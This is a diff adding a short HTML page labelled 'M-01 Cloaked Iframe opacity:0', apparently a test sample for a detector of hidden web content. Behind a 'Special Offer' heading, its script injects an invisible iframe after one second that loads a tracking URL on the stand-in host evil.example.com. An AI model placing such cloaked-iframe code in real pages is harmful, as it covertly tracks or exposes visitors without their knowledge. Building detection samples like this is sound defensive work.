@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html><head><title>M-01 Cloaked Iframe opacity:0</title></head><body>
+<h1>Welcome — Special Offer</h1>
+<script>
+setTimeout(() => {
+    const iframe = document.createElement('iframe');
+    iframe.style.opacity = '0';
+    iframe.src = 'https://evil.example.com/track';
+    document.body.appendChild(iframe);
+}, 1000);
+</script>
+</body></html>
